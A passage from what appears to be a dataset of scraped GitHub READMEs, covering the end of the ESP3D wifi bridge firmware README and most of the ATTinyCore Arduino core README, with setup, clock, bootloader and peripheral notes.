not only to have a cheap bridge between wifi and serial, but also to have a web ui to configure wifi, to monitor 3d printer and even control it, and to make things easy, ui is fully customizable without reflashing fw.\nfirmware should work with any 3d printer firmware (repetier/marlin/smoothieware using gcode) if serial connection has a correct setup. i currently use it with my personnal flavor of repetier for due based boards.\nthe web interface files are present in data directory but ui has it's own repository esp3d-webui.\nbe aware esp3d-webui is for firmware 0.9.99 minimum - previous released version use tpl files which are no more used.\nnote for esp8266 1mb flash : fw is now too big will all features you need to chose strip the fw and select only some features, also webui is now also too big for full multilanguage support to fit the 128k spiffs so please use pack with limited language (en +another) https://github.com/luc-github/esp3d-webui/tree/2.1/languages\nsponsors\nsupporters\nbecome a sponsor or a supporter\na sponsor is a recurent donator\nthe github sponsors are automaticaly displayed by github, if your tier is a big hug or more, to thank you for your support, your logo / avatar will be also added to the readme page with eventually with a link to your site.\na supporter is per time donator\nif your donation is over a per year sponsor tier a big hug, to thank you for your support, your logo / avatar will be added to the readme page with eventually with a link to your site.\nevery support is welcome, giving support/ developing new features need time and devices, donations contribute a lot to make things happen, thank you.\nfeatures\nserial/wifi bridge using configurable port 8888\nuse gpio2 to ground to reset all settings in hard way - 2-6 sec after boot / not before!! set gpio2 to ground before boot change boot mode and go to special boot that do not reach fw. currently boot take 10 sec - giving 8 seconds to connect gpio2 to gnd and do a hard recovery for settings\ncomplete configuration by web browser (station or access point) or by serial/telnet commands\nauthentication (optional) for better security\nupdate firmware by web browser\ncaptive portal in access point mode which redirect all unknow call to main page\nmdns which allows to key the name defined in web browser and connect only with bonjour installed on computer\nssdp, this feature is a discovery protocol, supported on windows out of the box\nfail safe mode (access point)is enabled if cannot connect to defined station at boot.\nembedded fs uploader and updater.\noled screen support\nnotifications using line / pushover / email\nthe web ui add even more feature : https://github.com/luc-github/esp3d-webui/blob/2.1/readme.md#features\ndefault configuration\ndefault settings:\naccess point: esp3d\npw:12345678\nauthentification: wpa\nip: 192.168.0.1\nbaud rate: 115200\nweb port:80\ndata port: 8888\nif authentication is enabled :\nuser: admin\npassword: admin\nuser:user\npassword: user\ndirect commands:\ncheck wiki : https://github.com/luc-github/esp3d/wiki/direct-esp3d-commands\ninstallation\nfeedback on 2.0 was : esp3d being a library is not really useful and make setup more complex, so now we are back to simple application.\nif you haven't already set up arduino ide for esps then do so for esp8266 or esp32 core version.\ndownload the latest release and manually copy the libraries present in the esp3d-x.y.z/libraries directory into your arduino/libraries directory. (no need if using platformio). these versions are verified to work with esp3d, any others (newer version) may cause untested behavior.\nuse webserver support (recommended as stable), asyncwebserver support is no longer stable on esp3d\narduinowebsockets from @links2004\ngeneric ones:\nspecific for esp32\nesp32ssdp if you want oled support:\noled-ssd1306 from @squix78\nif you want dht11/22 support:\ndht_sensor_library_for_espx from @beegee-tokyo\ncompile project esp3d.ino according target: esp8266 board or esp32 board, please review config.h to enable disable a feature, by default athentication is disabled and most others are enabled.\nfor esp8266 set cpu freq to 160mhz for better (https://github.com/luc-github/esp3d/wiki/install-instructions)\nupload the data content on esp3d file system\nusing spiffs uploader, this plugin and install instructions is available on each esp core - please refere to it or\nusing embedded uploader (you may need to format spiffs using : [esp710]format on esp8266 first)\nif embedded uploader does not show up you can force it ti display using : http://your_ip_address?forcefallback=yes\nupdate\ngenerate a binary using the export binary menu from arduino ide and upload it using esp-webui or embedded interface\n\u26a0\ufe0fdo not flash your printer fw with esp connected on serial - it bring troubles, at least on davinci, but no issue if you update using web ui\ncontribution/customization\nto style the code before pushing pr please use astyle --style=otbs *.h *.cpp *.ino\nthe embedded page is created using nodejs then gulp to generate a compressed html page (tool.html.gz), all necessary modules will be installed using the build.bat, you also need bin2c -----> tool !!!  (https://sourceforge.net/projects/bin2c/) to generate the h file from the binary, installation and build is done using the build.bat.\nthe corresponding ui is located here\nan optional ui was development using old repetier ui - check [ui\\repetier\\testui.htm] (https://raw.githubusercontent.com/wiki/luc-github/esp3d/ui/repetier/testui.htm) file\nneed more information about supported boards or wiring ?\ncheck the wiki\n\u2753any question ?\ncheck wiki or join the chat at\n\u2757any issue/feedback ?\ncheck wiki and faq if you still have issue: submit ticket\nif it is not an issue join discussion here\nesp3d is used by :\nopensource version is used by various boards like : https://www.aliexpress.com/wholesale?searchtext=esp3d&opensearch=true&switch_new_app=y and https://youtu.be/xoww0au6dge?t=76\nthis is for information only - i am not linked to these products, it is just a search result of a query using esp3d as keyword. so i am not responsible of any usage of them.\ncustom version (not this repository) is used on azteeg mini wifi : http://www.panucatt.com/azteeg_x5_mini_reprap_3d_printer_controller_p/ax5mini.htm\nand wifi boards for 3d printers : https://www.panucatt.com/productdetails.asp?productcode=wb8266,\n\u26a0\ufe0f do not use this repository for boards using custom firmware, you will lose several features.\nmore to come...\n\ud83d\udc4dthanks\nto @disneysw for bringing this module idea\nto @lkarlslund for suggestion about independent reset using gpio2\nto roy cortes from http://www.panucatt.com for supporting and pushing me implementing great features\nto all contributors, feedbacks owners and donations.\nif you use esp3d on your product, drop me a message so i can link your product page here.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000039, "year": null}, {"Unnamed: 0": 2082, "autor": 42, "date": null, "content": "ATTinyCore Universal\nArduino support for almost every classic tinyAVR device! Supports ATtiny 1634, 2313/4313, 24/44/84, 441/841, 25/45/85, 261/461/861, 87/167, 48/88, 43 and 828. Supports programming vis ISP, Serial (Optiboot - all parts with >4k flash, and all parts with 4k flash for which an 8k version is available) or VUSB (Micronucleus - where appropriate)\nState of ATTinyCore\nDevelopment of ATTinyCore is proceeding in the v2.0.0-dev branch.\nPLEASE DO NOT SUBMIT PR's AGAINST the \"MASTER\" BRANCH! YOUR CHANGES WILL BE LOST UPON THE NEXT RELEASE IF YOU DO NEW CHANGES NEED TO GO INTO v2.0.0-dev (which will be my next project after DxCore 1.3.7 release this week)\nIt's not usable presently due to incomplete work, but that is what all future releases will be made from. Notably, I belive the variant pins_arduino.h files are complete, showcasing both the range of new information available to the core and user code for all parts, and the new, consisitent formatting.\nATtiny26 support looks like it may be coming after all....\nCheck it out, we have \"discussions\" now!\nLet's use that, not gitter.\nCurrent strongly recommended IDE version: 1.8.13\nUsers of 1.6.x versions should use caution with any board manager packages as the handling of dependency versions, at least under 1.6.9, appears to be severely broken, such that installing one packages can break others. For example, DxCore won't work if ATYTinyCore is installed on 1.6.9! - both cores correctly specify their requirements, but the IDE does not use the correct versions of the toochain. It is likely that similar bugs involving other tools also manifest here. Use 1.8.13 or similar recent version if at all possible; if you are unwilling or unable to update your main Arduino IDE version, a \"portable\" installation is recommended - the separate copy of IDE with portable installation should ensure that what you do in that version does not effect the other version - if you can't use 1.8.13, a portable 1.6.9 version will achieve the same thing, only without the other fixes and improvements that went into the IDE since then.\nInstallation\nWiring and required external components\nUsing with Micronucleus boards\nProgramming Guide\nMigration Guide - moving to ATTinyCore from a different ATtiny board package\nATtinyCore Universal\nThis core supports the following processors - essentially every \"classic\" tinyAVR processor that makes sense to use with Arduino. The modern (post-2016 release) tinyAVR parts have their own core, as there is practically zero code at the core level that can be shared with classic parts (in exchange for the cores being totally different, sketches can often be moved between these with little to no effort - not always, but often) Click the processor name for part-specific information:\nATtiny441, 841 (With or without Optiboot or Micronucleus bootloader)\nATtiny1634 (With or without Optiboot bootloader)\nATtiny87, 167 (with or without Optiboot or Micronucleus bootloader)\nATtiny25, 45, 85 (With or without Optiboot or Micronucleus bootloader)\nATtiny24, 44, 84 (With or without Optiboot or Micronucleus bootloader)\nATtiny261, 461, 861 (With or without Optiboot bootloader)\nATtiny48, 88 (With or without Optiboot or Micronucleus bootloader)\nATtiny828 (With or without Optiboot bootloader)\nATtiny2313, 4313 (no bootloader)\nATtiny43 (no bootloader)\nVariants of these are also supported (such as the ATtiny1634R, ATtiny2313A or ATtiny85V)\nNon-supported parts\ntinyAVR 0/1/2-series Modern tinyAVR (with 0, 1, or 2 as next-to-last digit) are supported by my megaTinyCore instead. They are totally different in every way except the \"t-word\" in the name, and the fact that they're great parts and work well with Arduino.\nATtiny13/13A are supported by MicroCore by @MCUdude\nATtiny26 are not supported by any Arduino core. They are the obsolete predecessor to the '261, which itself is ancient). I will accept a PR to add support but will not use my own limited development time for such old and uninspiring parts.\nATtiny 4/5/10/11 and any other \"AVRrc\" (reduced core) parts. Try this core\nQuick Gotcha list - having trouble, read these!\nWindows users must install Micronucleus drivers manually If you want to use Micronucleus (VUSB) boards on Windows, you must manually install the drivers - Arduino does not run \"post-install\" tasks for third party libraries (though I am told they recognized how nonsensical this is - a malicious core could still run whatever commands it wanted to by telling the IDE that was how to compile sketches for these boards - and will be changing this in the future. Note also that the 1.5.0 release does not include working micronucleus upload tool for Windows, this is resolved in 1.5.2.\nDuring the install process it will print the path of a post_install.bat that it skipped running. Running that will install the drivers - it's easiest if you copy/paste it, as after installation the drivers will be located in C:\\Users\\YourUserName\\AppData\\Local\\Arduino15\\packages\\ATTinyCore\\tools\\micronucleus\\2.5-azd1\\ Or they can be downloaded from the following URL https://azduino.com/bin/micronucleus/Drivers-Digistump(win).zip . Unzip, run the installation batch file.\navrdude: error: could not find USB device with vid=0x16c0 pid=0x5dc vendor=www.fischl.de product='USBasp' Vaguely recent versions of AVRdude appear to have dropped a few versions of the firmware. If this is the first time you'd installed something that triggered an update here, you may have problems with AVRdude. The solution, thankfully, is straightforward.. .\nDownload Zadig from http://zadig.akeo.ie\nPlug in USBasp\nStart zadig\nOptions > List all devices\nSelect USBasp from the drop down menu\nSelect libusbK(v3.0.7.0) driver\nClick Install\nThis core includes part specific documentation - click the links above for your family of chips and READ IT These describe issues and \"gotchas\" specific to certain chips. Be sure to review this documentation!\nproblems dynamically linking libusb-0.1 on linux can occur if Arduino was installed through the Snap package manager. The Arduino IDE should always be installed from the tarball available from http://arduino.cc, never from a package manager.\nThere is a bug in the IDE that causes compilation errors with some combinations of boards and submenu options on 1.8.5 and earlier on Windows. The symptom of this is an error ending in something like C:\\Users\\yourusername\\AppData\\Local\\Temp\\arduino_build_131884/..\\arduino_cache_186227\\core\\core_ATTinyCore_avr_attinyx4_LTO_enable,chip_84,clock_8internal,eesave_aenable,bod_disable,pinmapping_anew,millis_enabled,neopixelport_porta_1bc5d2d7fe299bbd4d4a668366e76c74.a: No such file or directory - this is caused by the way it includes all options in the name of the file; where there are many menu options, this will exceed the maximum file name length under windows. This issue impacts many parts on ATTinyCore 1.3.0 and later, and the 841/441 on ATTinyCore 1.2.2 and later. To fix this issue without downgrading ATTinyCore, update to 1.8.6 or later of the IDE - 1.8.13 is STRONGLY recommended\nWindows store version sometimes experiences strange issues. The windows store issues are difficult to reproduce on other systems, and no reliable solutions to them are currently known. We recommend using the .zip package or standard installer version of the IDE, not the Windows Store version.\nOn IDEs prior to 1.8.13, you need to select the correct version of the programmer. In 1.8.13 only these programmers are shown. As of 1.4.2, the (ATTinyCore) note is removed, as 1.8.13 has had excellent uptake (because it lacks new bugs and greatly improves UX)\nWhen using a chip for the first time, or after changing the clock speed, EESAVE or BOD settings, you must do \"burn bootloader\" to set the fuses, even if you are not using the chip with a bootloader\nProblems programming some parts for first time, especially ATtiny841/441 These parts are less forgiving of the SCK clock rate. I'm not sure why USBAsp doesn't seem to be working anymore (it used to, and I haven't changed anything), looking into options there. Arduino as ISP or USBTinyISP SLOW will program without issue.\nChips sold as \"ATtiny85\" with wrong signature - enable verbose upload output, and it will tell you what sig it actually saw. 0x1e9005 means you got scammed (all 0's or all F's is wiring problem, or bricked chip from choosing clock source that isn't present). Apparently one or more foreign sellers have been remarking the much cheaper ATtiny12 as an 85 and ripping people off on ebay/etc.\nfree(): invalid next size (normal) error This error is due to a bug in AVRdude ( https://savannah.nongnu.org/bugs/?48776 ) - and it's a spurious error, as when it is displayed, the programming operation has actually completed successfully (you can see for yourself by enabling verbose upload, and noting the successful write before this error is shown. It is unknown under what conditions this error appears, though it has been recorded on a USBTinyISP on Linux when bootloading an attiny88 with optiboot.\nWhen using analogRead(), use the A# constant to refer to the pin, not the digital pin number. Analog channel number (see table in datasheet entry for ADMUX register) can also be used - unlike the official core, you can use analogRead() with the differential ADC channels (for example).\nWhen using I2C on anything other than the ATtiny48/88 you must use an I2C pullup resistor on SCL and SDA (if there isn't already one on the I2C device you're working with - many breakout boards include them). 4.7k or 10k is a good default value. On parts with real hardware I2C, the internal pullups are used, and this is sometimes good enough to work without external pullups; this is not the case for devices without hardware I2C (all devices supported by this core except 48/88) - the internal pullups can't be used here, so you must use external ones. That said, for maximum reliability, you should always use external pullups, even on the t48/88, as the internal pullups are not as strong as the specification requires.\nYou cannot use the Pxn notation (ie, PB2, PA1, etc) to refer to pins - these are defined by the compiler-supplied headers, and not to what an arduino user would expect. To refer to pins by port and bit, use PIN_Pxn (ex, PIN_PB2); these are #defined to the Arduino pin number for the pin in question, and can be used wherever digital pin numbers can be used. We recommend this method of referring to pins, especially on parts with multiple pinmapping options\nAll ATtiny chips (as well as the vast majority of digital integrated circuits) require a 0.1uF ceramic capacitor between Vcc and Gnd for decoupling; this should be located as close to the chip as possible (minimize length of wires to cap). Devices with multiple Vcc pins, or an AVcc pin, should use a cap on those pins too. Do not be fooled by poorly written tutorials or guides that omit these. Yes, I know that in some cases (ex, the x5-family) the datasheet doesn't mention these - but other users as well as myself have had problems when it was omitted on a t85.\nFor low power applications, before entering sleep, remember to turn off the ADC (ADCSRA&=(~(1<<ADEN))) - otherwise it will waste ~270uA\nWhen in power down sleep mode, the clock is stopped - using a slower clock speed does not save power while sleeping I am asked very frequently about using very low clock speeds in low-power applications. Almost invariably, upon further interrogation, the user reveals that they plan to have the part in power-down sleep mode almost all the time. In this case, there is often little to be gained from running at a lower clock speed, since it only effects power use in the brief moments that the chip is awake - even more so because these moments may well be shorter when running at a higher clock speed. Clock speeds below 1MHz can present problems while programming due to the programmer using an SCK clock speed too fast for the target chip running at such a low system clock speed.\nWhen using the WDT as a reset source and NOT using a bootloader remember that after reset the WDT will be enabled with minimum timeout. The very first thing your application must do upon restart is reset the WDT (wdt_reset()), clear WDRF flag in MCUSR (MCUSR&=~(1<<WDRF)) and then turn off or configure the WDT for your desired settings. If using the Optiboot bootloader, this is already done for you by the bootloader.\nATTinyCore Features\nOptiboot Support - serial bootloader for ATtiny441/841, 44/84, 45/85, 461/861, 48/88, 828, 1634, 87, 167 only)\nThe Optiboot bootloader is included for the ATtiny441, 841, 44, 84, 45, 85, 461, 861, 48, 88, 1634, 828, 87 and 167. For boards with a hardware UART, this runs at 57600 baud at 8 MHz and slower, and 115200 baud above that; for boards without hardware UART, it runs at 19200 baud (on these boards TX/RX pins are the same as the builtin software serial, the ones marked AIN0 (TX) and AIN1(RX)). On boards with hardware serial, the bootloader uses UART0 or the LIN/UART as appropriate (bootloaders that use UART1 for devices that have a second UART are included, prefixed with \"ser1\" - you must flash them manually or modify boards.txt if you wish to use them). Once the bootloader is programmed, the target can be programmed over serial; the bootloader will run after reset, just like on a normal Arduino. Bootloaders are not included for the 2k-flash versions of these parts - more than a quarter of the available flash would go to the bootloader, and the Arduino abstraction is already severely constrained with just 2k of flash. For these parts, we recommend ISP programming. Clock speeds lower than 1MHz are not supported because the resulting baud rates would be so low that it some serial adapters start having problems talking to them. At 1MHz, uploads are painfully slow. We recommend using the bootloader only at 8MHz or higher. If you are trying to save power, it is usually better to run at 8MHz and put the chip to sleep for most of the time.\nThe ATtiny441/841, ATtiny1634, ATtiny44/84, ATtiny45/85, ATtiny461/861, ATtiny48/88 and the ATtiny x7-family do not have hardware bootloader support. To make the bootloader work, the \"Virtual Boot\" functionality of Optiboot is used. Because of this, another vector is used to point to point to the start of the applications - this interrupt cannot be used by the application - under the hood, the bootloader rewrites the reset and \"save\" interrupt vectors, pointing the save vector at the start of the program (where the reset vector would have pointed), and the reset vector to the bootloader (as there is no BOOTRST fuse). Up until version 1.2.0 of this core, the WDT vector was used for this purpose. In 1.2.0 and later, the EE_RDY vector (which is not used by anything in Arduino-land - the EEPROM library uses a busy-wait) is used instead. If the bootloader was burned with 1.1.5 or earlier of this core, the WDT cannot be used to generate an interrupt (WDT as reset source is fine) - re-burning bootloader with 1.2.0 or later will resolve this.\nA warning about Virtual Boot\nVirtual boot relies on rewriting the vector table, such that the RESET vector points to the bootloader. This presents a potential issue: If the bootloader starts to write the first page, but then - for some reason - fails (such as a poorly timed reset right after the programming process begins), the page containing the reset vectors will be erased but not rewritten, with the result being that both the sketch and bootloader are hosed resulting in ISP programming being required to revive the chip. See #398\nSee the Programming Guide for more information on programming parts using Optiboot.\nMicronucleus - VUSB bootloader for 841, 167, 85, 88 and 84/84a\nIt's finally here! As of 1.4.0, we now offer Micronucleus (aka Digispark) support for some of the more popular boards for these bootloaders. This allows sketches to be uploaded directly via USB, which many users find highly convenient. This comes at a cost in terms of flash - they typically use around 1.5k of flash, and they sometimes have problems connecting to specific USB ports. These boards are available from various vendors; see the part-specific documentation pages for more information on the implementation used on specific parts. For more information on using Micronucleus, see the usage documentation.\nChanging the ATtiny clock speed and other settings\nChanging the ATtiny clock speed, B.O.D. settings etc, is easy. When an ATTinyCore board is selected from the Tools -> Board menu, there will appear extra submenus under Tools menu where we can set several ATtiny properties:\nTools > Save EEPROM: (Boards without bootloader only - controls whether EEPROM is erased during a chip erase cycle)\nTools > Timer 1 clock: (ATtiny25/45/85 only - allows Timer1 to be clocked off the PLL for higher frequency PWM)\nTools > LTO: (Link Time Optimization makes sketches smaller, but requires AVR boards 1.6.11 or later)\nTools > B.O.D Level: (trigger voltage for Brown Out Detection - below this voltage, chip will be held in reset)\nTools > Chip: (Select the part being used )\nTools > Clock: (Select the desired clock speed)\nTools > B.O.D. Mode (active): (441, 841, 1634, 828 only - see B. O. D. section below)\nTools > B.O.D. Mode (sleep): (441, 841, 1634, 828 only - see B. O. D. section below)\nAfter changing the clock source, BOD settings, or whether to save EEPROM on chip erase), you must do \"Burn Bootloader\" with an ISP programmer. See Programming Guide\nSupported clock speeds:\nSupported clock speeds are shown in the menus in descending order of usefulness, ie, the popular clock speeds/sources are at the top, and the weird ones are at the bottom. See the notes for caveats specific to certain clock speeds.\nInternal:\n8 MHz\n1 MHz\n16 MHz (PLL clock, x5, x61 only)\n16 MHz \u2021 (aggressively configured 441/841 only)\n4 MHz*** (except on x313, starts up at 1MHz and immediately switches to 4MHz before setup() is run)\n16.5MHz \u2020 ! (PLL clock, tweaked, x5, x61 Micronucleus only, for USB support)\n12.8MHz \u2020 \u2021 (Internal, tweaked hardcore, Micronucleus only, for USB support)\n0.5 MHz** \u203c (x313 only)\n512 kHz** \u203c (ULP - x41 only)\n256 kHz** \u203c (ULP - x41 only)\n128 kHz** \u203c (watchdog or ULP, all except 1643, 828)\n64 kHz** \u203c (ULP - x41 only)\n32 kHz** \u203c (ULP - 1634, 828, x41 only)\nExternal crystal (all except 828, 43 and x8-family):\n20 MHz !\n18.432 MHz* !\n16 MHz\n14.7456 MHz* !\n12 MHz !\n11.0592 MHz* !\n9.216 MHz* !\n8 MHz\n7.3728 MHz* !\n6 MHz !\n4 MHz\nAll available clock options for the selected processor will be shown in the Tools -> Clock menu.\n* These weird crystals are \"UART frequencies\" - these divide evenly to common baud rates, so you can get a perfect match if this is required for your application - typical UART use cases do not require running at one of these UART frequencies, the usual caveats about software serial and baud rate accuracy on classic (pre-2016) AVR designs notwithstanding. These crystal options are not available for chips without a UART in versions of ATTinyCore older than 1.1.5, and are never recommended for parts without a hardware serial port.\n** These options are slow enough that many ISP programmers may not be able to program them. Depending on the ISP programmer (and in some cases the firmware on it), there may be a setting or jumper to slow the SCK frequency down for programming these parts, or it may automatically figure it out. The SCK frequency must be less than 1/6th of the system clock for ISP programming. Before using a such a low clock speed, consider whether you might be able to get lower power consumption by running at a higher base clock while staying in sleep most of the time - this results in fewer programming headaches, and in many (but not all) use cases results in comparable or lower power consumption.\n*** The 4MHz internal option is useful if you are running near the minimum voltage - the lowest voltage for most of these parts is 1.8v, and at that voltage, they are only rated for 4MHz maximum. This starts up at 1 MHz and then switches to 4 MHz. Hence, bootloader performance is very slow, as it doesn't (yet) do this itself.\n\u2020 These speeds support USB when used with the internal clock. Available on Micronucleus boards only.\n\u2021 Aggressively tuned internal oscillators have to be slowed down when writing to EEPROM, and then sped back up. We attempt to correct millis timekeeping for this, but you may still see timing glitches. Please report any hangs or other bad behavior you observe with these, as this is a very new feature, and more aggressive measures to prevent CPU glitches may be required.\n! Micros takes longer to return on these clocks (64/clock cycles per microsecond is not an integer).\n\u203c micros() and delayMicroseconds() require a system clock of 1 MHz or higher.\nWarning Particularly in versions prior to 1.5.0, When using weird clock frequencies (those other than 16MHz, 8MHz, 4MHz, 2MHz, 1MHz, 0.5MHz), micros() is significantly slower (~ 110 clocks) (It reports the time at the point when it was called, not the end, however, and the time it gives is pretty close to reality). This combination of performance and accuracy is the result of hand tuning for these clock speeds. For other clock speeds (for example, if you add your own), it will be slower still - hundreds of clock cycles - though the numbers will be reasonably accurate, and reflect the time when it was called. millis() is not effected, only micros() and delay().\nThis differs from the behavior of official Arduino core - the \"stock\" micros() executes equally fast at all clock speeds, and instead returns wrong values for \"weird\" clock speeds (64/(clock speed in microseconds, rounded down to integer), rounded down to integer. 12.8 MHz is a special case and is handled exactly.\nThanks to @cburstedde for his work this his work towards making this suck less in the 1.5.0 release!\nUsing external CLOCK on 48, 88, and 828 (new in 1.3.3)\nThese parts do not support using an external crystal. External Clock, however, is supported - this requires an external clock source (not just a crystal) connected to the CLKI pin. DANGER if this clock source is not present, you must supply a clock source to CLKI pin before it can be reprogrammed, including to use a different clock source. The external CLOCK option is available through the IDE only for parts which don't support an external crystal. This is not the same as external crystal - do not use this option if you are unsure about the difference between external clock and external crystal! External clock sources are commonly sold as \"oscillators\", we recommend the KC5032A-series for it's low cost and wide operating voltage range of 1.6~5.5v (ie, the entire operating range of these parts!). Every other oscillator available from Digikey has a narrower voltage range (often 3.3v or 5v +/- 10%, though some work from wider ranges). Through-hole units are available, but expensive, and all have the restrictive supply voltage requirements. If selecting your own oscillator, you want an \"XO\" type.\nUsing external CLOCK (instead of crystal) on other parts\nThe use of an external clock - that is, a single wire with an appropriate clock signal is supplied to the XTAL1 pin from an external source, is possible using this core. This is an advanced feature, and is not supported directly through the IDE (except as noted above) to reduce the risk of people confusing it with external crystal and bricking their chips (if external clock is set as clock source when actually using external crystal, you must supply a clock signal on XTAL1 to program the chip again, including to set it to use a crystal again). To use an external clock:\nConnect the chip, and ensure that the external clock source is present.\nSelect the desired clock speed with the external crystal option.\nFrom File -> Preferences, ensure that \"Show verbose output\" is enabled for \"uploading\".\nConnect your ISP programmer.\nChoose \"Burn Bootloader\". This will set all the selected fuses, only it will be set to use a crystal (this is fine, the external clock will substitute this). However, at this point the XTAL2 pin will not be usable as GPIO.\nScroll up in the bottom pane of the IDE to the top of the upload output. The first line will be the avrdude command used to burn the bootloader. Copy this into a text editor. If the command includes -e, remove -e and everything after it. If it just points to the bootloader hex file, remove \"-Uflash:w:(path to bootloader .hex file):i\" from the end of the command.\nAdd -Ulfuse:w:0xF0:m to the end of the command.\nCopy/paste this command into a command window, and hit return. Your chip should now be running on the external clock, and the XTAL2 pin (but not the XTAL1 pin) will be available for use normally.\nWhen compiling for and uploading to your now-externally-clocked part, use the external crystal option corresponding to the clock speed you are using.\nDetermining clock speed and source from within the sketch\nThe clock speed is made available via the F_CPU #define - you can test this using #if macro\nIn version 1.3.3 and later, the clock source is also made available via the CLOCK_SOURCE #define. CLOCK_SOURCE can take one of the following values (as of 1.4.0, it is expanded to cover a few weird clocking situations: the low 4 bits identify the source, and high 4 bits identify special things regarding it:\n0 - Internal 8MHz oscillator, not prescaled, or prescaled to 1 MHz (ie, fully set by fuses)\n1 - External Crystal\n2 - External Clock (only available within the core on the 48, 88 and 828, as described above - note that above steps to use external clock on other parts, this will still be 1, not 2; as far as the core knows, it's a crystal)\n3 - Internal WDT oscillator (not available on the x41, 1634, and 828)\n4 - Internal ULP oscillator (available only on the x41, 1634, and 828)\n5 - Internal 4MHz oscillator (present only on the x313 parts - if the 8MHz internal oscillator is prescaled to 4MHz, CLOCK_SOURCE will be 0, not 5)\n6 - Internal PLL (x5 and x61 only)\n15 or 0x10 (ie, 0x10 | 0) - Internal oscillator with prescaling not set by fuses (ie, not 1 MHz or 8 MHz - ie, 2 or 4 MHz)\n17 or 0x11 (ie, 0x10 | 1) - External crystal at 16MHz, which may be prescaled to get lower frequencies (for Digispark Pro ATtiny167)\n18 or 0x12 (ie, 0x10 | 2) - External clock at 16MHz, which may be prescaled to get lower frequencies (for MH Tiny ATtiny88)\nRefer to pins by port/pin\nInstead of referring to pins by the digital pin numbers, it is now (as of 1.4.0) possible to refer to pins based on their port and pin number within the port. We recommend this method of referring to pins in all cases, as it can be more easily cross-referenced with the datasheet, and is independent of pin mapping (for devices with multiple pin mapping options). It also helps to build good mental habits with regards to thinking about pins in the context of ports, which is helpful when writing code where more advanced techniques are needed. For every pin, the core supplies a constant of the form PIN_Pxn, where x is the port letter, and n is the bit of the pin within that port; this is a #define set to the digital pin number corresponding to it. For example, PIN_PA2 refers to bit 2 in PORTA. On the ATtiny167, where there are three different pin mappings, all radically different, analogWrite(PIN_PA2,128) will always generate a squarewave on the same pin, and the code can be moved between pinmappings without concern.\nAssembler Listing generation\nIn version 1.2.2 and later, Sketch -> Export compiled binary will generate an assembly listing in the sketch folder; this is particularly useful when attempting to reduce flash usage, as you can see how much flash is used by different functions.\nLink-time Optimization (LTO) support\nLink time optimization is enabled by default. If compiling with very old versions of the IDE, this must be disabled. Cases do exist where this setting can change behavior of a sketch; in all cases where this has been observed, a bug in the code was hidden by one setting or the other, and/or undefined behavior was invoked. This is a problem with your code, not the core.\nMakefile Support\nFor those who prefer to compile with a makefile instead of the IDE, sketches can be compiled with https://github.com/sudar/Arduino-Makefile - See the makefile documentation for more information on specific steps needed for this process.\nI2C support\nYou must have external pullup resistors installed - unlike devices with a real hardware TWI port, the internal pullups cannot be used with USI-based I2C to make simple cases (short wires, small number of tolerant slave devices) work. In all cases, including parts with hardware I2C where it may work sometimes, you should always use external pullup resistors, as the internal ones are far weaker than the I2C standard requires for reliable operation.\nOn the following chips, I2C functionality can be achieved with the hardware USI. As of version 1.1.3 this is handled transparently via the special version of the Wire library included with this core. Be aware that USI-based I2C is not available when USI-based SPI is in use.\nATtiny x5 (25/45/85)\nATtiny x4 (24/44/84)\nATtiny x61 (262/461/861)\nATtiny x7 (87/167)\nATtiny x313 (2313/4313)\nATtiny1634\nOn the following chips, slave I2C functionality is provided in hardware, but a software implementation must be used for master functionality. This is done automatically with the included Wire library. In versions prior to 1.2.2, USI on these devices is a flash-hog; this has been greatly improved in 1.2.2.\nATtiny828\nATtiny x41 (441/841)\nOn the following chips, full master/slave I2C functionality is provided in hardware and the Wire library uses it:\nATtiny x8 (48, 88)\nSPI support:\nOn the following chips, full SPI functionality is provided in hardware, and works identically to SPI on Atmega chips:\nATtiny828\nATtiny x7 (87/167) (it has both a USI and full SPI, but the SPI library will use the SPI hardware)\nATtiny x41 (441/841)\nATtiny x8 (48, 88)\nOn the following chips, SPI functionality can be achieved with the hardware USI - as of version 1.1.3 of this core, this should be handled transparently via the SPI library. Take care to note that the USI does not have MISO/MOSI, it has DI/DO; when operating in master mode, DI is MISO, and DO is MOSI. When operating in slave mode, DI is MOSI and DO is MISO. The #defines for MISO and MOSI assume master mode (as this is much more common). Clock dividers 2, 4, 8 and >=14 are implemented as separate routines; call SPISettings or setClockDivider with a constant value to use less program space, otherwise, all routines will be included along with 32-bit math. Clock dividers larger than 14 are only approximate because the routine is optimized for size, not exactness. Also, interrupts are not disabled during data transfer as SPI clock doesn't need to be precise in most cases. If you use long interrupt routines or require consistent clocking, wrap calls to transfer in ATOMIC_BLOCK. Be aware that USI-based I2C is not available when USI-based SPI is in use.\nATtiny x5 (25/45/85)\nATtiny x4 (24/44/84)\nATtiny x61 (262/461/861)\nATtiny x7 (87/167)\nATtiny x313 (2313/4313)\nATtiny1634\nSerial Support\nOn the following chips, full serial (UART) support is provided in hardware, as Serial (and Serial1 for parts with two serial ports):\nATtiny x313 (2313/4313)\nATtiny x7 (87/167 - LIN support, including a very fancy baud rate generator)\nATtiny x41 (441/841 - two UARTs)\nATtiny1634 (two UARTs)\nATtiny828\nOn the following chips, no hardware serial is available, however, a built-in software serial named Serial is provided to maximize compatibility. This uses the analog comparator pins (to take advantage of the interrupt, since very few sketches/libraries use it, while lots of sketches/libraries use PCINTs). TX is AIN0, RX is AIN1 - This is a software implementation - as such, you cannot receive and send at the same time. If you try, you'll get gibberish, just like using SoftwareSerial. See also the discussion of baud rates.\nATtiny x5 (25/45/85)\nATtiny x4 (24/44/84)\nATtiny x61 (261/461/861)\nATtiny x8 (48/88)\nATtiny43\nThis core is also fully compatible with the usual SoftwareSerial library if you want a software serial port on a different pin - however, you can still only transmit or receive on a single software serial instance at a time - on parts without hardware serial, this includes the builtin software serial \"Serial\" implementation noted above.\nWarning: Internal oscillator and Serial Note that when using the internal oscillator or pll clock, you may need to tune the chip (using one of many tiny tuning sketches) and set OSCCAL to the value the tuner gives you on startup in order to make serial (software or hardware) work at all - the internal clock is only calibrated to +/- 10% in most cases, while serial communication requires it to be within just a few percent. However, in practice, a larger portion of parts work without tuning than would be expected from the spec. That said, for the ATtiny x4, x5, x8, and x61-family I have yet to encounter a chip that was not close enough for serial using the internal oscillator at 3.3-5v at room temperature - This is consistent with the Typical Characteristics section of the datasheet, which indicates that the oscillator is fairly stable w/respect to voltage, but highly dependent on temperature.\nThe ATtiny x41-family, 1634R, and 828R have an internal oscillator factory calibrated to +/- 2% - but only at operating voltage below 4v. Above 4v, the oscillator gets significantly faster, and is no longer good enough for UART communications. The 1634 and 828 (non-R) are not as 